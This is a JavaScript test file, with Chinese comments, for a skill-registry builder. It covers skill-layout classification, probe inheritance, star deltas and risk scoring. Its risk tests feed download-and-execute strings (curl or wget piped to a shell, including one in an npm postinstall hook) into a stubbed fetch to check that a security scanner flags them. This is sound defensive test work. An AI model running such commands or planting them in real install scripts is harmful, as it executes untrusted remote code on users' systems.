// C 技能安装形态判定测试：classifyTree 扩展（单技能/合集/深层埋藏/根脚本）+ 增量继承。
// 守护：skills 条目能区分「市场可装的技能形态」与「大项目内部 SKILL.md 埋藏」。

import { classifyTree, shouldInheritProbe, applyStarDeltas, riskScorecardOf, needsRiskEval, shouldScanScripts, evalRepoRisk, enrichRiskScorecards } from "../../build-registry.mjs";

let pass = 0, fail = 0;
function check(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) pass++; else fail++;
  console.log(`${ok ? "PASS" : "FAIL"} ${name}: got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
}

const blob = (path) => ({ type: "blob", path });

// ---- C：根 SKILL.md = 单技能形态 ----
{
  const c = classifyTree([blob("SKILL.md"), blob("README.md")], false);
  check("C 根 SKILL.md → has_skill=true", c.has_skill, true);
  check("C 根 SKILL.md → root_skill=true（单技能形态）", c.root_skill, true);
  check("C 根 SKILL.md → skill_min_depth=1", c.skill_min_depth, 1);
  check("C 根 SKILL.md → root_script=false", c.root_script, false);
}

// ---- C：skills/<name>/SKILL.md = 技能合集（路径 3 段）----
{
  const c = classifyTree([blob("skills/memory/SKILL.md"), blob("skills/vision/SKILL.md")], false);
  check("C skills/ 合集 → has_skill=true", c.has_skill, true);
  check("C skills/ 合集 → root_skill=false", c.root_skill, false);
  check("C skills/ 合集 → skill_min_depth=3（skills/<name>/ 段数）", c.skill_min_depth, 3);
}

// ---- C：深层埋藏（大项目内部，非市场可装）----
{
  const c = classifyTree([blob("bot/workspace/skills/web/SKILL.md")], false);
  check("C 深层埋藏 → skill_min_depth=5（bot/workspace/skills/ 埋藏）", c.skill_min_depth, 5);
}

// ---- C：根 install 脚本 ----
{
  const c = classifyTree([blob("SKILL.md"), blob("install.sh")], false);
  check("C 根 install.sh → root_script=true", c.root_script, true);
  check("C 深层 install.sh → root_script=false（同款只认根）", classifyTree([blob("scripts/install.sh")], false).root_script, false);
}

// ---- C：has_skill=false 时形态字段缺省 ----
{
  const c = classifyTree([blob("package.json")], false);
  check("C 无 SKILL.md → has_skill=false", c.has_skill, false);
  check("C 无 SKILL.md → root_skill=false", c.root_skill, false);
  check("C 无 SKILL.md → skill_min_depth=null", c.skill_min_depth, null);
}

// ---- C：truncated 保守（未命中 → null 而非 false）----
{
  const c = classifyTree([blob("package.json")], true);
  check("C truncated 未命中 → root_skill=null（保守不误判）", c.root_skill, null);
  check("C truncated 未命中 → root_script=null", c.root_script, null);
}

// ---- C：增量继承（形态字段随探测结果一起继承）----
{
  const repo = { full_name: "a/b", updated_at: "2026-08-01" };
  const old = { full_name: "a/b", updated_at: "2026-08-01", has_skill: true, root_skill: false, skill_min_depth: 2, root_script: false };
  check("C updated_at 未变 + 有真实结果 → 继承", shouldInheritProbe(repo, old), true);
}
{
  const repo = { full_name: "a/b", updated_at: "2026-08-02" };
  const old = { full_name: "a/b", updated_at: "2026-08-01", has_skill: true };
  check("C updated_at 已变 → 不继承（重新探测）", shouldInheritProbe(repo, old), false);
}
{
  const repo = { full_name: "a/b", updated_at: "2026-08-01" };
  const old = { full_name: "a/b", updated_at: "2026-08-01", has_skill: null };
  check("C 旧结果 null（未知）→ 不继承（重跑探测收敛）", shouldInheritProbe(repo, old), false);
}

// ---- S1：applyStarDeltas 基线 diff（Map<小写 full_name, stars>）----
{
  const mk = (extra) => ({ full_name: "O/R", stargazers_count: 100, ...extra });
  const b7 = new Map([["o/r", 60]]);
  const b30 = new Map([["o/r", 30]]);

  // 正常差值：cur - prev，大小写不敏感
  const r1 = mk();
  applyStarDeltas([r1], [{ days: 7, map: b7 }, { days: 30, map: b30 }]);
  check("delta 7d 差值", r1.stars_delta_7d, 40);
  check("delta 30d 差值", r1.stars_delta_30d, 70);

  // 基线缺失该仓库（新收录）→ null（诚实未知，不编造 0）
  const r2 = mk({ full_name: "New/Repo" });
  applyStarDeltas([r2], [{ days: 7, map: b7 }]);
  check("delta 新收录 → null", r2.stars_delta_7d, null);

  // 基线整表缺失（无 token/API 失败）→ null
  const r3 = mk();
  applyStarDeltas([r3], [{ days: 7, map: null }]);
  check("delta 基线 null → null", r3.stars_delta_7d, null);

  // 负增长（掉星）如实反映
  const r4 = mk({ stargazers_count: 10 });
  applyStarDeltas([r4], [{ days: 7, map: b7 }]);
  check("delta 负增长如实", r4.stars_delta_7d, -50);

  // 零星仓库 delta 可为 0（基线存在 → 真实差值，非编造）
  const r5 = mk({ stargazers_count: 0 });
  applyStarDeltas([r5], [{ days: 7, map: new Map([["o/r", 0]]) }]);
  check("delta 零星 → 0", r5.stars_delta_7d, 0);

  // stargazers_count 缺失按 0 处理
  const r6 = { full_name: "O/R" };
  applyStarDeltas([r6], [{ days: 7, map: b7 }]);
  check("delta 缺 stars → -prev", r6.stars_delta_7d, -60);
}

// ---- S3：风险记分卡（riskScorecardOf / needsRiskEval / shouldScanScripts / evalRepoRisk）----
{
  // 档位映射：critical/high → risk，medium → caution，无命中 → safe
  check("S3 无命中 → safe", riskScorecardOf([]).tier, "safe");
  check("S3 medium → caution", riskScorecardOf([{ id: "rc", category: "rcModify", severity: "medium" }]).tier, "caution");
  check("S3 high → risk", riskScorecardOf([{ id: "crontab", category: "pathStartup", severity: "high" }]).tier, "risk");
  check("S3 critical → risk", riskScorecardOf([{ id: "curl-pipe-shell", category: "downloadExec", severity: "critical" }]).tier, "risk");
  check("S3 medium+critical → risk（取最高）", riskScorecardOf([
    { id: "rc", category: "rcModify", severity: "medium" },
    { id: "pipe", category: "downloadExec", severity: "critical" }
  ]).tier, "risk");

  // flags 去重 + 透明明细保留
  const card = riskScorecardOf([
    { id: "a", category: "exfil", severity: "high" },
    { id: "a", category: "exfil", severity: "high" },
    { id: "b", category: "credRead", severity: "critical" }
  ]);
  check("S3 flags 按 id 去重", card.flags.length, 2);
  check("S3 flags 保留 id/category/severity", card.flags[0], { id: "a", category: "exfil", severity: "high" });

  // flags 上限 6 条
  const many = riskScorecardOf(Array.from({ length: 9 }, (_, i) => ({ id: `r${i}`, category: "fileOps", severity: "medium" })));
  check("S3 flags 封顶 6 条", many.flags.length, 6);

  // needsRiskEval：未评估 / updated_at 变了 → 重估；一致 → 跳过
  check("S3 未评估 → 需评估", needsRiskEval({ full_name: "a/b", updated_at: "2026-09-01" }), true);
  check("S3 risk_at=updated_at → 跳过", needsRiskEval({ updated_at: "2026-09-01", risk_at: "2026-09-01" }), false);
  check("S3 推过（updated_at 变）→ 重估", needsRiskEval({ updated_at: "2026-09-10", risk_at: "2026-09-01" }), true);

  // shouldScanScripts：确证无脚本才跳，未知/无探测字段都拉
  check("S3 root_script=false → 不拉", shouldScanScripts({ root_script: false }), false);
  check("S3 has_install_script=false → 不拉", shouldScanScripts({ has_install_script: false }), false);
  check("S3 root_script=true → 拉", shouldScanScripts({ root_script: true }), true);
  check("S3 探测未知（null）→ 拉（补盲区）", shouldScanScripts({ root_script: null }), true);
  check("S3 dsh 无探测字段 → 拉", shouldScanScripts({ full_name: "a/b" }), true);
}

// ---- S3：evalRepoRisk 端到端（注入 fetch 替身）----
{
  const mkFetch = (map) => async (url) => {
    const file = url.split("/").pop();
    const hit = map[file];
    if (hit === undefined) return { ok: false, status: 404 };
    if (hit instanceof Error) return { ok: false, status: 500 };
    return { ok: true, status: 200, text: async () => hit };
  };

  // curl|sh 恶意 install.sh → risk 档 + downloadExec flag
  const r1 = { full_name: "evil/repo", updated_at: "2026-09-01", default_branch: "main" };
  await evalRepoRisk(r1, mkFetch({ "install.sh": "curl https://x.y/z.sh | bash" }));
  check("S3 curl|sh → risk", r1.risk_tier, "risk");
  check("S3 flags 含命中明细", r1.risk_flags.some((f) => f.category === "downloadExec"), true);
  check("S3 risk_at 记录评估基线", r1.risk_at, "2026-09-01");

  // 干净仓库 → safe 档，flags 不写
  const r2 = { full_name: "good/repo", updated_at: "2026-09-01" };
  await evalRepoRisk(r2, mkFetch({ "package.json": "{\"name\":\"x\"}" }));
  check("S3 干净 → safe", r2.risk_tier, "safe");
  check("S3 safe 不写 flags", "risk_flags" in r2, false);

  // 抓取 error → 不盖章（下轮重试），risk_at 不写
  const r3 = { full_name: "net/repo", updated_at: "2026-09-01" };
  const done3 = await evalRepoRisk(r3, mkFetch({ "package.json": new Error("boom"), "install.sh": new Error("boom"), "install.ps1": new Error("boom") }));
  check("S3 抓取失败 → 不盖章", done3, false);
  check("S3 未评估不写 risk_tier", "risk_tier" in r3, false);

  // npm 生命周期命令命中（postinstall curl）
  const r4 = { full_name: "hook/repo", updated_at: "2026-09-01" };
  await evalRepoRisk(r4, mkFetch({ "package.json": "{\"scripts\":{\"postinstall\":\"curl https://e.vil/x | sh\"}}" }));
  check("S3 生命周期命中 → 非 safe", r4.risk_tier !== "safe", true);

  // enrichRiskScorecards：混合条目各归其位，失败条目不盖章
  const repos = [
    { full_name: "a/ok", updated_at: "2026-09-01" },
    { full_name: "b/bad", updated_at: "2026-09-01" },
    { full_name: "c/done", updated_at: "2026-09-01", risk_at: "2026-09-01", risk_tier: "safe" },
    { full_name: "d/fail", updated_at: "2026-09-01" }
  ];
  const res = await enrichRiskScorecards(repos, async (url) => {
    if (url.includes("d/fail")) return { ok: false, status: 500 };
    if (url.includes("b/bad") && url.endsWith("install.sh")) return { ok: true, status: 200, text: async () => "wget x | sh" };
    return { ok: false, status: 404 };
  });
  check("S3 已评估条目跳过", res.evaluated, 2);
  check("S3 失败条目 pending", res.pending, 1);
  check("S3 b/bad → risk", repos[1].risk_tier, "risk");
  check("S3 a/ok → safe", repos[0].risk_tier, "safe");
  check("S3 c/done 未被覆盖", repos[2].risk_tier, "safe");
  check("S3 d/fail 无 risk_tier", "risk_tier" in repos[3], false);
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
